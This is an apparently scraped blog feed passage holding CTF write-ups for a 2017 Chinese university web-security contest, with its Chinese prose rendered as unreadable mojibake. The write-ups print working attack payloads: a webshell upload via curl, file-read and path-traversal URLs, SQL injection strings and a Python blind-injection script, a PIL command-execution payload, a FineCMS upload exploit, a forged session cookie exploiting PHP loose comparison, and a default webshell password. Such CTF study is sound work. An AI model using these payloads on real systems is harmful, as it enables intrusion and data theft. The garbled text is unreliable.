class="string">"http://114.55.36.69:46012/upload.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"upfile"</span>&gt;æ–‡ä»¶åï¼š&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"upfile"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"æäº¤"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br>æ¯”èµ›çš„æ—¶å€™æ­»æ´»çŒœä¸å‡ºæ–‡ä»¶å‚æ•°åï¼Œfileã€uploadã€uploadfileéƒ½è¯•è¿‡ï¼Œèµ›åç»å¤§ä½¬æé†’æ‰çŸ¥é“æ˜¯<code>upfile</code><br>ä¹Ÿå¯ä»¥ç›´æ¥ç”¨curlä¸Šä¼ æ–‡ä»¶ï¼Œå­¦åˆ°äº†<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;114.55.36.69:46012&#x2F;upload.php -F &quot;upfile&#x3D;@x.php&quot;</span><br></pre></td></tr></table></figure><br>ä¸Šä¼ åèœåˆ€è¿æ¥ï¼ŒæŸ¥çœ‹webç›®å½•ä¸‹çš„flag.phpæ‹¿åˆ°flag<br><img src="/img/2017-mooctest-sec-2.png" alt=""></p>
<h2 id="3-curl"><a href="#3-curl" class="headerlink" title="3.curl"></a>3.curl</h2><p>è¿‡æ»¤äº†<code>file:</code>åé¢çš„<code>/</code>ï¼ŒæŠŠ<code>/</code>è½¬æˆ<code>0x2f</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;114.55.36.69:46013&#x2F;index.php?url&#x3D;file:0x2f0x2f&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</span><br></pre></td></tr></table></figure><br><img src="/img/2017-mooctest-sec-3.png" alt=""></p>
<h2 id="4-war"><a href="#4-war" class="headerlink" title="4.war"></a>4.war</h2><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œä¸‹è½½trick-or-treat.war<br><img src="/img/2017-mooctest-sec-4.png" alt=""></p>
<h2 id="5-readme2"><a href="#5-readme2" class="headerlink" title="5.readme2"></a>5.readme2</h2><p>åœ¨jsæ–‡ä»¶é‡Œå‘ç°<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;114.55.36.69:46015&#x2F;test&#x2F;show.do?page&#x3D;help.jsp</span><br></pre></td></tr></table></figure><br>çŒœæµ‹æ˜¯ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯»å–javawebå·¥ç¨‹çš„<code>WEB-INF/web.xml</code>æ–‡ä»¶<br><img src="/img/2017-mooctest-sec-5.png" alt=""><br>æ¥ç€è¯»å–<code>WEB-INF/properties/configInfo.properties</code><br><img src="/img/2017-mooctest-sec-6.png" alt=""><br>å‘ç°<code>key.jsp</code>ï¼Œè¯»å–<code>key.jsp</code><br><img src="/img/2017-mooctest-sec-7.png" alt=""></p>
<h2 id="6-source-ip"><a href="#6-source-ip" class="headerlink" title="6.source ip"></a>6.source ip</h2><p>å»fofaæœæ ‡é¢˜ï¼Œè¯•äº†ä¸‰å››ä¸ªå°±è¯•å‡ºæ¥äº†ï¼Œå¬è¯´è¿˜æœ‰å‘é‚®ä»¶å§¿åŠ¿æ›´ä¼˜é›…<br><img src="/img/2017-mooctest-sec-8.png" alt=""></p>
<h2 id="7-hackedsite"><a href="#7-hackedsite" class="headerlink" title="7.hackedsite"></a>7.hackedsite</h2><p>æ‰«æå¾—åˆ°<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.178.18.181:46017&#x2F;upload&#x2F;phpspy.php</span><br></pre></td></tr></table></figure><br>ç™¾åº¦æœç´¢phpspyå¾—åˆ°å¯†ç <code>angle</code>ï¼Œè¿æ¥å¤§é©¬æ‹¿åˆ°flag<br><img src="/img/2017-mooctest-sec-9.png" alt=""></p>
<h2 id="8-babysql3"><a href="#8-babysql3" class="headerlink" title="8.babysql3"></a>8.babysql3</h2><p>nameå­—æ®µå­˜åœ¨æ³¨å…¥ï¼Œæ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyname&#x3D;1&amp;name&#x3D;name&#96; union select 1,2,flag from flag %23</span><br></pre></td></tr></table></figure><br><img src="/img/2017-mooctest-sec-10.png" alt=""></p>
<h2 id="9-snake"><a href="#9-snake" class="headerlink" title="9.snake"></a>9.snake</h2><p>æç¤ºäº†<code>PIL-RCE</code><br>å‚è€ƒ<a href="https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability.md" target="_blank" rel="noopener">https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability.md</a><br>æ„é€ pocæ–‡ä»¶ä¸­çš„ä»£ç ä¸º<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%pipe%cat &#x2F;var&#x2F;www&#x2F;Flask&#x2F;flag &gt; tmp&#x2F;fffffff.png)</span><br></pre></td></tr></table></figure><br>ä¸Šä¼ å¾—åˆ°flag<br><img src="/img/2017-mooctest-sec-11.png" alt=""></p>
<h2 id="10-thinkphp5"><a href="#10-thinkphp5" class="headerlink" title="10.thinkphp5"></a>10.thinkphp5</h2><p>æ— </p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å‘¨æœ«å»å¹¿å·æ°´äº†ä¸€æ³¢ï¼Œæ¯”èµ›çš„æ—¶å€™åšå‡ºæ¥7é“é¢˜ï¼Œèµ›åè¡¥ä¸Š2ã€3ä¸¤é¢˜ï¼Œä¸‹é¢æ˜¯å‰9é¢˜çš„WriteUpï¼ŒæœŸå¾…å¤§ä½¬çš„ç¬¬10é¢˜WriteUp&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>2017 å…¨å›½å¤§å­¦ç”Ÿè½¯ä»¶æµ‹è¯•å¤§èµ›webå®‰å…¨èµ›é¢„èµ› WriteUp</title>
    <link href="https://www.codemonster.cn/2017/10/23/2017-mooctest-first-writeup/"/>
    <id>https://www.codemonster.cn/2017/10/23/2017-mooctest-first-writeup/</id>
    <published>2017-10-23T12:20:13.000Z</published>
    <updated>2018-05-04T07:47:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>å…¶å®å°±æ˜¯æ…•æµ‹å®‰æ’æ¯<br>6æœˆ18æ—¥çš„å¤å­£é¢„èµ›çº¿ä¸Šèµ›ï¼Œ9æœˆ22æ—¥æ›´æ–°babysqlï¼Œ10æœˆ12æ—¥æ›´æ–°findpwdã€æœåŠ¡å‘ç°ã€babylogin<br>10æœˆ23æ›´æ–°ç§‹å­£é¢„èµ›é¢˜ç›®<br><a id="more"></a></p>
<h1 id="å¤å­£é¢„èµ›"><a href="#å¤å­£é¢„èµ›" class="headerlink" title="å¤å­£é¢„èµ›"></a>å¤å­£é¢„èµ›</h1><h2 id="æ ¹æ®ipæŸ¥dnsè§£æè®°å½•"><a href="#æ ¹æ®ipæŸ¥dnsè§£æè®°å½•" class="headerlink" title="æ ¹æ®ipæŸ¥dnsè§£æè®°å½•"></a>æ ¹æ®ipæŸ¥dnsè§£æè®°å½•</h2><p>é¢˜ç›®åŸæ„æ˜¯è®©æˆ‘ä»¬ç”¨cmdçš„nslookupå‘½ä»¤ï¼Œæˆ‘ç›´æ¥ä¸ŠdnsåæŸ¥ç½‘ç«™æŸ¥çš„</p>
<p>åˆ°è¿™ä¸ªç½‘ç«™æŸ¥dnsè§£æ<a href="https://www.boip.net/ipv4/" target="_blank" rel="noopener">https://www.boip.net/ipv4/</a></p>
<p>flagä¸º<code>this-is-flag</code></p>
<h2 id="ç¼–è¾‘å™¨æ³„éœ²"><a href="#ç¼–è¾‘å™¨æ³„éœ²" class="headerlink" title="ç¼–è¾‘å™¨æ³„éœ²"></a>ç¼–è¾‘å™¨æ³„éœ²</h2><p>é¢˜ç›®æç¤ºç¼–è¾‘å™¨æ³„éœ²,fuzzåä¸‹è½½åˆ°äº†<code>login.php.swp</code>ï¼Œç”¨<code>vim -r login.php.swp</code>æ¢å¤å¾—åˆ°æºç ï¼Œçœ‹åˆ°æ˜æ–‡è´¦å·å¯†ç ï¼Œ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($userin==<span class="string">"admin94wo"</span>)</span><br><span class="line"><span class="keyword">if</span>($passin==<span class="string">"ca1buda0mima7ah4ha"</span>)</span><br></pre></td></tr></table></figure><br>ç”¨è´¦å·å¯†ç ç™»å½•login.phpå¾—åˆ°flagï¼Œ<code>flag{b4ckup_1s_normal}</code></p>
<h2 id="babywaf"><a href="#babywaf" class="headerlink" title="babywaf"></a>babywaf</h2><p>fuzzåå‘ç° &lt; è¢«è¿‡æ»¤äº†ï¼Œæ„é€ post file=.&lt;./.&lt;./.&lt;./.&lt;./.&lt;./flag æäº¤å¾—åˆ°flagï¼Œ<code>flag{To0_young_2_simple!}</code></p>
<h2 id="ç»¼åˆæ¸—é€"><a href="#ç»¼åˆæ¸—é€" class="headerlink" title="ç»¼åˆæ¸—é€"></a>ç»¼åˆæ¸—é€</h2><p>é¢˜ç›®æç¤ºè®©æˆ‘ä»¬å¤ç°expï¼Œè¯¥ç«™ç”¨çš„æ˜¯<code>finecms</code></p>
<p>ç™¾åº¦å¾—åˆ°æ­¤cmsçš„ä¸€ä¸ªä¸Šä¼ æ¼æ´ï¼Œæ„é€ htmlæ–‡ä»¶å¦‚ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ª<code>phtml</code>åç¼€çš„ä¸€å¥è¯ä¸Šå»ï¼Œèœåˆ€è¿æ¥åœ¨<code>/flag</code>å¾—åˆ°flagï¼Œ<code>flag{o1d_bug_t0_send_point!}</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">â€utf-8â€³</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Finecms ajaxswfupload exp<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">â€http://114.55.88.132:20580/index.php?c</span>=<span class="string">attachment&amp;a</span>=<span class="string">ajaxswfuploadâ€</span> <span class="attr">method</span>=<span class="string">â€POSTâ€</span> <span class="attr">enctype</span>=<span class="string">â€multipart/form-dataâ€</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">â€fileâ€</span> <span class="attr">name</span>=<span class="string">â€Filedataâ€</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">â€hiddenâ€</span> <span class="attr">name</span>=<span class="string">â€typeâ€</span> <span class="attr">value</span>=<span class="string">â€phtmlâ€</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">â€hiddenâ€</span> <span class="attr">name</span>=<span class="string">â€sizeâ€</span> <span class="attr">value</span>=<span class="string">â€100â€³</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">â€submitâ€</span> <span class="attr">name</span>=<span class="string">â€submitâ€</span> <span class="attr">value</span>=<span class="string">â€ä¸Šä¼ æ–‡ä»¶â€</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>è¿™é“é¢˜åˆ°æœ€åä¹Ÿæ²¡åšå‡ºæ¥ï¼ŒæŠ¥é”™æ³¨å…¥æ³¨ï¼Œè¿‡æ»¤äº†<code>union</code>å’Œ<code>column_name</code>è¿˜æœ‰<code>*</code>ï¼Œä¸çŸ¥é“å­—æ®µåæ˜¯å•¥</p>
<p>å‚è€ƒäº†<a href="http://www.wupco.cn/?p=3764" target="_blank" rel="noopener">http://www.wupco.cn/?p=3764</a><br>ä»è¯¥æ–‡ç« ä¸­å¯ä»¥å¾—çŸ¥è¿™é“æ³¨å…¥é¢˜çš„æ ¸å¿ƒä»£ç å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"desc `error_&#123;$table&#125;`"</span>;</span><br><span class="line">$res = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(mysql_fetch_array($res)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;no table detail&lt;/center&gt;"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from error_$&#123;table&#125; where id = $id"</span>;</span><br></pre></td></tr></table></figure><br>å¯ä»¥çœ‹å‡ºé€šè¿‡<code>desc</code>è¯­å¥åˆ¤æ–­tableæ˜¯å¦å­˜åœ¨ï¼Œå†æ‰§è¡Œä¸‹ä¸€ä¸ªsqlè¯­å¥<br>DESCçš„è¯­æ³•å¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DESC tbl_name [col_name | wild]</span><br></pre></td></tr></table></figure><br>æ„é€ payloadå¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;114.55.36.69:20680&#x2F;index.php?table&#x3D;flag&#96; &#96;a%&amp;id&#x3D;3</span><br></pre></td></tr></table></figure><br>pythonè„šæœ¬å¦‚ä¸‹<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line">r1=r.session()</span><br><span class="line">s=<span class="string">"abcdefghijklmnopqrstuvwxyz1234567890_"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">  url=<span class="string">"http://114.55.36.69:20680/index.php?table=flag` `&#123;0&#125;%&amp;id=3"</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">    url2=url.format(str(flag+j))</span><br><span class="line">    r2=r1.get(url2)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"SQL"</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">      flag+=j</span><br><span class="line">      <span class="keyword">print</span> flag</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure><br>å¾—åˆ°<code>error_flag</code>è¡¨çš„å­—æ®µåä¸º<code>flag_you_will_never_know</code><br>å†ä½¿ç”¨æŠ¥é”™æ³¨å…¥æŸ¥è¯¢å³å¯æ‹¿åˆ°flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;114.55.36.69:20680&#x2F;index.php?table&#x3D;news&amp;id&#x3D;3 -updatexml(1,concat(&#39;a&#x3D;.&#39;,(select flag_you_will_never_know from error_flag)),1)#</span><br></pre></td></tr></table></figure></p>
<h2 id="æœåŠ¡å‘ç°"><a href="#æœåŠ¡å‘ç°" class="headerlink" title="æœåŠ¡å‘ç°"></a>æœåŠ¡å‘ç°</h2><p>nmapæ‰«æåå‘ç°<code>rsync</code>å¼€æ”¾<br>rsyncç©ºå£ä»¤<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@<span class="built_in">test</span> ~]<span class="comment"># rsync 118.178.18.181::</span></span><br><span class="line"><span class="built_in">source</span> code   </span><br><span class="line">[root@<span class="built_in">test</span> ~]<span class="comment"># rsync 118.178.18.181::source\ code/</span></span><br><span class="line">drwxr-xr-x        4096 2017/06/14 13:01:20 .</span><br><span class="line">-rw-r--r--          44 2017/06/14 13:01:20 flag.php</span><br><span class="line">-rw-r--r--          26 2017/06/14 13:01:20 index.php</span><br><span class="line">[root@<span class="built_in">test</span> ~]<span class="comment"># rsync -azv 118.178.18.181::source\ code/flag.php ~/flag.txt</span></span><br><span class="line">receiving incremental file list</span><br><span class="line"></span><br><span class="line">sent 19 bytes  received 41 bytes  120.00 bytes/sec</span><br><span class="line">total size is 44  speedup is 0.73</span><br><span class="line">[root@<span class="built_in">test</span> ~]<span class="comment"># cat flag.txt</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"flag&#123;rsync_i5_very_useful!&#125;"</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="findpwd"><a href="#findpwd" class="headerlink" title="findpwd"></a>findpwd</h2><p>é¢˜ç›®æç¤ºäº†å¼€å‘è€…ç”¨çš„ideæ˜¯netbeanï¼ŒæŸ¥çœ‹ideå·¥ä½œç©ºé—´çš„æ–‡ä»¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.178.18.181:20880&#x2F;nbproject&#x2F;private&#x2F;private.xml</span><br></pre></td></tr></table></figure></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project-private</span> <span class="attr">xmlns</span>=<span class="string">"http://www.netbeans.org/ns/project-private/1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">editor-bookmarks</span> <span class="attr">xmlns</span>=<span class="string">"http://www.netbeans.org/ns/editor-bookmarks/2"</span> <span class="attr">lastBookmarkId</span>=<span class="string">"0"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">open-files</span> <span class="attr">xmlns</span>=<span class="string">"http://www.netbeans.org/ns/projectui-open-files/2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">file</span>&gt;</span>file:/var/www/html/fuckbean/index.php<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">file</span>&gt;</span></span><br><span class="line">file:/var/www/html/fuckbean/f1ndmyp4ssw0rdnineverno.php</span><br><span class="line"><span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">file</span>&gt;</span>file:/var/www/html/fuckbean/1.sql<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">open-files</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project-private</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°<code>1.sql</code>å’Œ<code>f1ndmyp4ssw0rdnineverno.php</code>ä¸¤ä¸ªæ–‡ä»¶<br>f1ndmyp4ssw0rdnineverno.phpæ˜¯ä¸ªè¾“å…¥é‚®ç®±æ‰¾å›å¯†ç çš„é¡µé¢<br>ä¸‹è½½<code>1.sql</code>ï¼Œè¿™é‡Œå°±å¯ä»¥çŒœæµ‹å¯èƒ½æ˜¯æ³¨å…¥<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> <span class="keyword">if</span> <span class="keyword">exists</span> fuckbean;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> fuckbean;</span><br><span class="line"><span class="keyword">use</span> fuckbean;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span>(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">5</span>),</span><br><span class="line">username <span class="built_in">varchar</span>(<span class="number">20</span>),</span><br><span class="line"><span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">32</span>),</span><br><span class="line">mail    <span class="built_in">varchar</span>(<span class="number">50</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">"admin"</span>,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span>,<span class="string">"admin@admin.com"</span>);</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">on</span> fuckbean.* <span class="keyword">to</span> fuckbean@localhost <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'fuckbean'</span>;</span><br></pre></td></tr></table></figure><br>æ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#39;union select 1,2,3,0xxxxxxx-- a@qq.com</span><br></pre></td></tr></table></figure><br>å…¶ä¸­<code>0xxxxxxx</code>æ˜¯ä½ è‡ªå·±çš„é‚®ç®±çš„hexï¼Œæäº¤åæ”¶åˆ°flagé‚®ä»¶</p>
<h2 id="babylogin"><a href="#babylogin" class="headerlink" title="babylogin"></a>babylogin</h2><p>é¢˜ç›®ç»™äº†æºä»£ç ï¼Œå…³é”®è¯­å¥å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$key <span class="keyword">as</span> $key2 =&gt; $value) &#123;</span><br><span class="line">        $_GPC[$key2]=$value;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$session = json_decode(base64_decode($_GPC[<span class="string">'__session'</span>]), <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (is_array($session))&#123;</span><br><span class="line">        $user = find_user_by_uid($session[<span class="string">'uid'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(is_array($user) &amp;&amp; $session[<span class="string">'hash'</span>] == $user[<span class="string">'password'</span>])&#123;</span><br><span class="line">            $_SESSION[<span class="string">"login"</span>]=<span class="number">1</span>;</span><br><span class="line">            $_SESSION[<span class="string">"userin"</span>]=$userin;</span><br><span class="line">            header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹å‡º<code>session</code>å¯æ§ï¼Œè€Œä¸”å­˜åœ¨<code>==</code>å¼±ç±»å‹,<code>True==&quot;xxxxxxx&quot;</code> æ’æˆç«‹<br>ç”¨å¦‚ä¸‹ä»£ç æ„é€ payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$session[<span class="string">'uid'</span>]=<span class="number">1</span>;</span><br><span class="line">$session[<span class="string">'hash'</span>]=<span class="keyword">True</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(json_encode($session));</span><br></pre></td></tr></table></figure><br>æœ€åæŠ“ç™»é™†çš„åŒ…ï¼ŒåŠ ä¸€ä¸ªå‚æ•°<code>__session</code>å€¼ä¸º<code>eyJ1aWQiOjEsImhhc2giOnRydWV9</code>å°±èƒ½è·³è½¬åˆ°<code>admin.php</code></p>
<h2 id="phpçš„é”…"><a href="#phpçš„é”…" class="headerlink" title="phpçš„é”…"></a>phpçš„é”…</h2><p>æ”¹å¤©å†™å¥½äº†</p>
<h1 id="ç§‹å­£é¢„èµ›"><a href="#ç§‹å­£é¢„èµ›" class="headerlink" title="ç§‹å­£é¢„èµ›"></a>ç§‹å­£é¢„èµ›</h1><h2 id="éƒ½æ˜¯phpå°±ä¸å¥½ç©äº†å‘€"><a href="#éƒ½æ˜¯phpå°±ä¸å¥½ç©äº†å‘€" class="headerlink" title="éƒ½æ˜¯phpå°±ä¸å¥½ç©äº†å‘€"></a>éƒ½æ˜¯phpå°±ä¸å¥½ç©äº†å‘€</h2><p>é¢˜ç›®åœ°å€ï¼š <a href="http://118.178.18.181:57016/index.pl?file=test.txt" target="_blank" rel="noopener">http://118.178.18.181:57016/index.pl?file=test.txt</a><br>perlå†™çš„ï¼Œç›´æ¥è¯»å–<code>index.pl</code>å°±èƒ½æ‹¿åˆ°flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.178.18.181:57016&#x2F;index.pl?file&#x3D;index.pl</span><br></pre></td></tr></table></figure></p>
